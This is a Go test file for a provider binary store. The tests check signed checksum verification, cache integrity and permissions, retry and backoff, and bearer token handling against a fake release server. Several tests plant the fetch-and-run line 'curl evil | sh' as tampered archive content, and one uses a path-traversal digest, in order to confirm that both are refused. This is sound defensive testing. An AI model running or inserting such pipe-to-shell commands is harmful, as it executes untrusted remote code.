package providers

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

const testVersion = "0.2.0"

func archiveWith(t *testing.T, executable string, body []byte) []byte {
	t.Helper()

	var gzipped bytes.Buffer
	zw := gzip.NewWriter(&gzipped)
	tw := tar.NewWriter(zw)
	for _, entry := range []struct {
		name string
		body []byte
		mode int64
	}{
		{"LICENSE", []byte("MIT\n"), 0o644},
		{executable, body, 0o755},
	} {
		if err := tw.WriteHeader(&tar.Header{Name: entry.name, Mode: entry.mode, Size: int64(len(entry.body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatalf("tar header: %v", err)
		}
		if _, err := tw.Write(entry.body); err != nil {
			t.Fatalf("tar body: %v", err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	return gzipped.Bytes()
}

func digestOf(body []byte) string {
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}

type release struct {
	server   *httptest.Server
	archives map[string][]byte
	requests atomic.Int32
	statuses map[string][]int
	auth     atomic.Value
	unsigned atomic.Bool
	altered  atomic.Bool
}

func countersigned(checksums, identity string) []byte {
	return fmt.Appendf(nil, "%s signs %s", identity, digestOf([]byte(checksums)))
}

func countersigns(checksums, signature []byte, identity string) error {
	if want := countersigned(string(checksums), identity); !bytes.Equal(signature, want) {
		return fmt.Errorf("%s contains %q, want %q", SignatureAsset, signature, want)
	}
	return nil
}

func fakeRelease(t *testing.T, names ...string) *release {
	t.Helper()

	rel := &release{archives: map[string][]byte{}, statuses: map[string][]int{}}
	var checksums strings.Builder
	for _, name := range names {
		for _, platform := range Platforms {
			asset := AssetName(KindProvider, name, testVersion, platform.GOOS, platform.GOARCH)
			body := archiveWith(t, ExecutableName(KindProvider, name, platform.GOOS), []byte("#!/bin/sh\necho "+name+"\n"))
			rel.archives[asset] = body
			fmt.Fprintf(&checksums, "%s  %s\n", digestOf(body), asset)
		}
	}
	fmt.Fprintf(&checksums, "%s  ocel_%s_linux_amd64.tar.gz\n", digestOf([]byte("cli")), testVersion)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		rel.requests.Add(1)
		rel.auth.Store(r.Header.Get("Authorization"))
		if !strings.HasPrefix(r.URL.Path, "/v"+testVersion+"/") {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		asset := strings.TrimPrefix(r.URL.Path, "/v"+testVersion+"/")
		if pending := rel.statuses[asset]; len(pending) > 0 {
			status := pending[0]
			rel.statuses[asset] = pending[1:]
			w.Header().Set("Retry-After", "1")
			w.WriteHeader(status)
			return
		}
		if asset == ChecksumsAsset {
			body := checksums.String()
			if rel.altered.Load() {
				body += digestOf([]byte("evil")) + "  ocel-provider-evil_" + testVersion + "_linux_amd64.tar.gz\n"
			}
			_, _ = w.Write([]byte(body))
			return
		}
		if asset == SignatureAsset {
			if rel.unsigned.Load() {
				w.WriteHeader(http.StatusNotFound)
				return
			}
			_, _ = w.Write(countersigned(checksums.String(), SignerIdentity(testVersion)))
			return
		}
		body, ok := rel.archives[asset]
		if !ok {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		_, _ = w.Write(body)
	})
	rel.server = httptest.NewServer(mux)
	t.Cleanup(rel.server.Close)
	return rel
}

func storeFor(t *testing.T, rel *release) *Store {
	t.Helper()
	return &Store{
		Dir:      t.TempDir(),
		Version:  testVersion,
		Platform: Platform{GOOS: "linux", GOARCH: "amd64"},
		BaseURL:  rel.server.URL,
		HTTP:     rel.server.Client(),
		Sleep:    func(time.Duration) {},
		Verify:   countersigns,
	}
}

func pinsOf(t *testing.T, store *Store) map[string]string {
	t.Helper()
	sums, err := store.Checksums(context.Background())
	if err != nil {
		t.Fatalf("Checksums: %v", err)
	}
	return sums
}

func TestAFetchedProviderLandsInTheCache(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}

	want := filepath.Join(store.Dir, "provider", "aws", testVersion, "linux-amd64", digest, "provider-aws")
	if path != want {
		t.Fatalf("Binary() = %q, want %q", path, want)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat the fetched provider: %v", err)
	}
	if info.Mode().Perm()&0o100 == 0 {
		t.Fatalf("the fetched provider is not executable: %v", info.Mode())
	}

	before := rel.requests.Load()
	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
		t.Fatalf("second Binary: %v", err)
	}
	if rel.requests.Load() != before {
		t.Fatal("a cached provider was fetched again")
	}
}

func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	pinned := pinsOf(t, store)[asset]

	rel.archives[asset] = archiveWith(t, "provider-aws", []byte("#!/bin/sh\ncurl evil | sh\n"))

	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, pinned)
	if err == nil {
		t.Fatal("Binary() error = nil, want the tampered archive refused")
	}
	if !strings.Contains(err.Error(), pinned) {
		t.Errorf("error %q does not name the digest the lock pins", err.Error())
	}

	if entries, err := os.ReadDir(store.Dir); err != nil || len(entries) != 0 {
		t.Fatalf("the cache contains %v (err %v), want nothing written", entries, err)
	}
}

func TestACachedProviderAlteredAfterItsInstallIsRefetched(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}
	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	before := rel.requests.Load()
	again, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
	if err != nil {
		t.Fatalf("second Binary: %v", err)
	}
	if again != path {
		t.Fatalf("Binary() = %q, want the same path %q", again, path)
	}
	if rel.requests.Load() == before {
		t.Fatal("an altered cache entry was served without being fetched again")
	}
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(body), "evil") {
		t.Fatalf("the altered provider is still cached: %q", body)
	}
}

func TestACachedProviderAlteredAfterItsInstallIsRefusedWhenItCannotBeRefetched(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}
	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	rel.server.Close()

	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err == nil {
		t.Fatal("Binary() error = nil, want the altered cache entry refused")
	}
}

func TestALockPinningAnotherDigestIsNeverServedFromTheCache(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
		t.Fatalf("Binary: %v", err)
	}

	other := strings.Repeat("a", 64)
	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, other)
	if err == nil {
		t.Fatal("Binary() error = nil, want the archive the release serves refused against the other pin")
	}
	if !strings.Contains(err.Error(), other) {
		t.Errorf("error %q does not name the digest the lock pins", err.Error())
	}
}

func TestADigestThatIsNotASha256IsRefusedRatherThanMadeIntoAPath(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)

	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "../../../../etc")
	if err == nil {
		t.Fatal("Binary() error = nil, want a digest that is not a sha256 refused")
	}
	if rel.requests.Load() != 0 {
		t.Fatal("the release was reached for a digest that is not a sha256")
	}
}

func TestTheProviderCacheIsReadableOnlyByTheUserThatFetchedIt(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Dir = filepath.Join(store.Dir, "providers")
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}

	for dir := filepath.Dir(path); dir != filepath.Dir(store.Dir); dir = filepath.Dir(dir) {
		info, err := os.Stat(dir)
		if err != nil {
			t.Fatalf("stat %s: %v", dir, err)
		}
		if got := info.Mode().Perm(); got != 0o700 {
			t.Errorf("%s is %v, want 0700", dir, got)
		}
	}
}

func TestAProvidersDirSkipsTheFetchEntirely(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Override = t.TempDir()

	dir := filepath.Join(store.Override, "provider", "aws", testVersion, "linux-amd64")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	want := filepath.Join(dir, "provider-aws")
	if err := os.WriteFile(want, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "")
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}
	if path != want {
		t.Fatalf("Binary() = %q, want %q", path, want)
	}
	if rel.requests.Load() != 0 {
		t.Fatal("the release was reached for a provider the providers directory already contains")
	}
}

func TestAProvidersDirThatContainsNothingSaysSo(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Override = t.TempDir()

	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "")
	if err == nil {
		t.Fatal("Binary() error = nil, want the empty providers directory refused")
	}
	for _, want := range []string{OverrideEnvVar, store.Override, testVersion} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not name %q", err.Error(), want)
		}
	}
}

func TestAThrottledReleaseIsRetriedAndThenServed(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	var waited []time.Duration
	store.Sleep = func(d time.Duration) { waited = append(waited, d) }
	rel.statuses[asset] = []int{http.StatusTooManyRequests, http.StatusServiceUnavailable}

	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
		t.Fatalf("Binary: %v", err)
	}
	if len(waited) != 2 {
		t.Fatalf("waited %v, want a backoff between each of the two throttled attempts", waited)
	}
	for i, d := range waited {
		if d <= 0 || d > maxBackoff {
			t.Fatalf("backoff %d = %v, want a positive wait under the %v ceiling", i, d, maxBackoff)
		}
	}
	if waited[0] == waited[1] {
		t.Fatalf("backoffs %v include no jitter", waited)
	}
}

func TestAReleaseThatStaysThrottledGivesUpNamingTheThrottle(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	for range attempts {
		rel.statuses[asset] = append(rel.statuses[asset], http.StatusTooManyRequests)
	}

	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
	if err == nil {
		t.Fatal("Binary() error = nil, want the throttle reported")
	}
	if !strings.Contains(err.Error(), "429") {
		t.Errorf("error %q does not name the throttle", err.Error())
	}
}

func TestAMissingArchiveIsNotRetried(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)

	before := rel.requests.Load()
	if _, err := store.Binary(context.Background(), KindProvider, "gcp", store.Platform, strings.Repeat("0", 64)); err == nil {
		t.Fatal("Binary() error = nil, want the missing archive refused")
	}
	if got := rel.requests.Load() - before; got != 1 {
		t.Fatalf("%d requests for an archive the release does not include, want 1", got)
	}
}

func TestATokenIsSentAsABearerAgainstTheRateLimit(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Token = "gh-token"

	if _, err := store.Checksums(context.Background()); err != nil {
		t.Fatalf("Checksums: %v", err)
	}
	if got := rel.auth.Load(); got != "Bearer gh-token" {
		t.Fatalf("Authorization = %v, want a bearer token", got)
	}
}

func TestChecksumsAReleaseSignsNothingOverArePinnedNowhere(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	rel.unsigned.Store(true)
	store := storeFor(t, rel)

	_, err := store.Checksums(context.Background())
	if err == nil {
		t.Fatal("Checksums() error = nil, want checksums with no signature beside them refused")
	}
	if !strings.Contains(err.Error(), SignatureAsset) {
		t.Errorf("error %q does not name the signature it looked for", err.Error())
	}
}

func TestChecksumsAlteredAfterTheReleaseSignedThemArePinnedNowhere(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	rel.altered.Store(true)
	store := storeFor(t, rel)

	sums, err := store.Checksums(context.Background())
	if err == nil {
		t.Fatal("Checksums() error = nil, want checksums the signature does not cover refused")
	}
	if sums != nil {
		t.Fatalf("Checksums() = %v, want nothing to pin", sums)
	}
}

func TestAReleaseSignedByAnotherWorkflowIsPinnedNowhere(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Verify = func(checksums, signature []byte, identity string) error {
		return countersigns(checksums, signature, "https://github.com/elsewhere/.github/workflows/binaries.yml@refs/tags/v"+testVersion)
	}

	if _, err := store.Checksums(context.Background()); err == nil {
		t.Fatal("Checksums() error = nil, want a signature made under another identity refused")
	}
}

func TestTheIdentityAReleaseMustBeSignedUnderNamesTheTagBeingRun(t *testing.T) {
	t.Parallel()

	if got, want := SignerIdentity(testVersion), SignerWorkflow+"@refs/tags/v"+testVersion; got != want {
		t.Fatalf("SignerIdentity(%q) = %q, want %q", testVersion, got, want)
	}
}

func TestNoTokenSendsNoCredential(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)

	if _, err := store.Checksums(context.Background()); err != nil {
		t.Fatalf("Checksums: %v", err)
	}
	if got := rel.auth.Load(); got != "" {
		t.Fatalf("Authorization = %v, want none sent", got)
	}
}
